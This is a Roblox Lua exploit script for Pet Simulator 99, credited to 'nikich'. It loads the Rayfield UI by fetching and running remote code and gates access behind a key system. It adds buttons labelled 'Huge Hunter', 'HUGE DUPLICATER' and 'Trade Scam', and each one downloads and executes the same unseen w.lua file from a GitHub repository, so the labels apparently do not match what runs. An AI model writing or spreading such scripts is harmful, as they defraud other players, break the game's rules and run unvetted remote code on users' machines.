if game.PlaceId == 8737899170 then

end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Pet Simulator 99 | PS99 📌",
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by nikich",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "NikichHUB"
   },
   Discord = {
      Enabled = true,
      Invite = "t.me/petsgorps99scripts", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "NikichHUB | Key 🔑",
      Subtitle = "Key 🔑 | petsgorps99scripts",
      Note = "\ EN \ WHEN YOU ACTIVATE IT, THERE WILL BE A RE-ENTRY TO ENABLE THE SCRIPT \ RUS \ КОГДА АКТИВИРУЕТЕ - БУДЕТ ПЕРЕЗАХОД ДЛЯ ВКЛЮЧЕНИЯ СКРИПТА",
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"123"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

    local MainTab = Window:CreateTab("🐱 Home", nil) -- Title, Image
    local MainSection = MainTab:CreateSection("🐶 Pet Changer")

    local Button = MainTab:CreateButton({
   Name = "[🐱] Huge Hunter (CLICK)",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Dilleron1/esqsq/refs/heads/main/w.lua'))()
    end,
})

    local Button = MainTab:CreateButton({
   Name = "[🐱] HUGE DUPLICATER (CLICK)",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Dilleron1/esqsq/refs/heads/main/w.lua'))()
    end,
})

    local Button = MainTab:CreateButton({
   Name = "[💱] Trade Scam (CLICK)",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Dilleron1/esqsq/refs/heads/main/w.lua'))()
    end,
})